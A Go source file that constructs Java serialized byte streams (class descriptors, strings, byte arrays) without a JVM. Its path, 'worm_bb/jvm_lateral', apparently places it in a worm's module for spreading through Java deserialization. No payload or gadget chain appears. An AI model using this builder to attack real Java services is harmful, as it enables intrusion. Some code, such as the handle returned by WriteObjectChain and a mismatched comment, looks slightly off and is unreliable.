// worm_bb/jvm_lateral/serial.go
// Java Object Serialization Stream Protocol (Go-native).
// Constructs valid Java serialized bytes without a JVM.

package jvm_lateral


const (
	STREAM_MAGIC   = 0xACED
	STREAM_VERSION = 5
)

// TC opcodes
const (
	TC_NULL         = 0x70
	TC_REFERENCE    = 0x71
	TC_CLASSDESC    = 0x72
	TC_OBJECT       = 0x73
	TC_STRING       = 0x74
	TC_ARRAY        = 0x75
	TC_CLASS        = 0x76
	TC_BLOCKDATA    = 0x77
	TC_ENDBLOCKDATA = 0x78
	TC_RESET        = 0x79
	TC_LONGSTRING   = 0x7C
	TC_PROXYCLASSDESC = 0x7D
	TC_ENUM         = 0x7E
)

const (
	SC_WRITE_METHOD = 0x01
	SC_SERIALIZABLE = 0x02
	SC_EXTERNALIZABLE = 0x04
	SC_BLOCK_DATA   = 0x08
)

// Stream builds Java serialized byte streams
type Stream struct {
	buf     []byte
	nextHdl int32 // starts at baseWireHandle (0x7E0000)
}

func NewStream() *Stream {
	s := &Stream{nextHdl: 0x7E0000}
	s.w2(STREAM_MAGIC)
	s.w2(STREAM_VERSION)
	return s
}

func (s *Stream) Bytes() []byte           { return s.buf }
func (s *Stream) Len() int                { return len(s.buf) }
func (s *Stream) nextHandle() int32       { h := s.nextHdl; s.nextHdl++; return h }

// Low-level writers
func (s *Stream) w1(b ...byte)            { s.buf = append(s.buf, b...) }
func (s *Stream) w2(v uint16)             { s.buf = append(s.buf, byte(v>>8), byte(v)) }
func (s *Stream) w4(v int32)              { s.buf = append(s.buf, byte(v>>24), byte(v>>16), byte(v>>8), byte(v)) }
func (s *Stream) w8(v int64)              { s.buf = append(s.buf, byte(v>>56), byte(v>>48), byte(v>>40), byte(v>>32), byte(v>>24), byte(v>>16), byte(v>>8), byte(v)) }
func (s *Stream) tc(v byte)               { s.w1(v) }
func (s *Stream) utf(v string)            { b := []byte(v); s.w2(uint16(len(b))); s.w1(b...) }

// WriteClassDesc writes TC_CLASSDESC, returns its handle
func (s *Stream) WriteClassDesc(name string, uid int64, flags byte, fields []FieldDef) int32 {
	s.tc(TC_CLASSDESC)
	h := s.nextHandle()
	s.w4(h)
	s.utf(name)
	s.w8(uid)
	s.w1(flags)
	s.w2(uint16(len(fields)))
	for _, f := range fields {
		s.w1(f.Type)
		if f.Type == 'L' || f.Type == '[' {
			s.utf(f.ClassName)
		}
		s.utf(f.Name)
	}
	s.tc(TC_ENDBLOCKDATA)
	return h
}

// WriteObject writes TC_OBJECT + classdata fields
func (s *Stream) WriteObject(classHdl int32) { s.tc(TC_OBJECT); s.WriteRef(classHdl) }

// WriteRef writes TC_REFERENCE
func (s *Stream) WriteRef(hdl int32) { s.tc(TC_REFERENCE); s.w4(hdl) }

// WriteString writes TC_STRING, returns the string's handle
func (s *Stream) WriteString(v string) int32 {
	s.tc(TC_STRING); h := s.nextHandle(); s.w4(h); s.utf(v)
	return h
}

// WriteNull writes TC_NULL
func (s *Stream) WriteNull() { s.tc(TC_NULL) }

// WriteBool writes a boolean field value
func (s *Stream) WriteBool(v bool) {
	if v {
		s.w1(1)
	} else {
		s.w1(0)
	}
}

// WriteInt writes a 4-byte int field value
func (s *Stream) WriteInt(v int32) { s.w4(v) }

// WriteByteArray writes TC_ARRAY for a byte[] 
// Returns the array object's handle.
func (s *Stream) WriteByteArray(data []byte) int32 {
	s.tc(TC_ARRAY)
	h := s.nextHandle()
	s.w4(h)
	// class descriptor for byte[]: [B
	s.tc(TC_CLASSDESC)
	ch := s.nextHandle()
	s.w4(ch)
	s.utf("[B")
	s.w8(0)
	s.w1(SC_SERIALIZABLE)
	s.w2(0)
	s.tc(TC_ENDBLOCKDATA)
	s.WriteNullSuper()
	s.w4(int32(len(data)))
	s.w1(data...)
	return h
}

// WriteByteArray2D writes TC_ARRAY for byte[][]
// Returns the 2D array handle.
func (s *Stream) WriteByteArray2D(rows [][]byte) int32 {
	s.tc(TC_ARRAY)
	h := s.nextHandle()
	s.w4(h)
	// class descriptor for [[B (array of byte arrays)
	s.tc(TC_CLASSDESC)
	ch := s.nextHandle()
	s.w4(ch)
	s.utf("[[B")
	s.w8(0)
	s.w1(SC_SERIALIZABLE)
	s.w2(0)
	s.tc(TC_ENDBLOCKDATA)
	s.WriteNullSuper()
	s.w4(int32(len(rows)))
	for _, row := range rows {
		s.WriteByteArray(row)
	}
	return h
}

// WriteSuper ends a classdesc's annotation block and writes superclass
// The superHdl should be the handle of a previously-written classdesc.
// Use WriteNullSuper() for java.lang.Object.
func (s *Stream) WriteSuper(superHdl int32) { s.WriteRef(superHdl) }
func (s *Stream) WriteNullSuper()           { s.tc(TC_NULL) }

// FieldDef describes a serializable field
type FieldDef struct {
	Type      byte   // 'B','C','D','F','I','J','S','Z','[','L'
	ClassName string // field's class name (for 'L' and '[' types)
	Name      string // field name
}

func Fld(t byte, name string) FieldDef         { return FieldDef{Type: t, Name: name} }
func ObjFld(cls, name string) FieldDef          { return FieldDef{Type: 'L', ClassName: cls, Name: name} }
func ArrFld(cls, name string) FieldDef         { return FieldDef{Type: '[', ClassName: cls, Name: name} }

// WriteObjectChain writes a complete classdesc hierarchy + object
// in one shot. Returns the object's handle.
func (s *Stream) WriteObjectChain(name string, uid int64, flags byte, fields []FieldDef, data []byte, superName string, superUID int64) int32 {
	// classdesc
	s.tc(TC_CLASSDESC)
	ch := s.nextHandle()
	s.w4(ch)
	s.utf(name)
	s.w8(uid)
	s.w1(flags)
	s.w2(uint16(len(fields)))
	for _, f := range fields {
		s.w1(f.Type)
		if f.Type == 'L' || f.Type == '[' {
			s.utf(f.ClassName)
		}
		s.utf(f.Name)
	}
	s.tc(TC_ENDBLOCKDATA)

	// super classdesc
	if superName != "" {
		s.tc(TC_CLASSDESC)
		sh := s.nextHandle()
		s.w4(sh)
		s.utf(superName)
		s.w8(superUID)
		s.w1(SC_SERIALIZABLE)
		s.w2(0)
		s.tc(TC_ENDBLOCKDATA)
		s.WriteNullSuper()
	} else {
		s.WriteNullSuper()
	}

	// object + classdata
	s.tc(TC_OBJECT)
	s.WriteRef(ch)
	s.w1(data...)
	return s.nextHandle()
}

// String handle offset: reads the handle bytes written by WriteString
// and overwrites them. Returns the handle.
// (WriteString already handles this internally; this is for manual use)

// EnsureBuf ensures the stream has the expected bytes so far
// and returns them for verification
func (s *Stream) Dump() []byte { return append([]byte{}, s.buf...) }
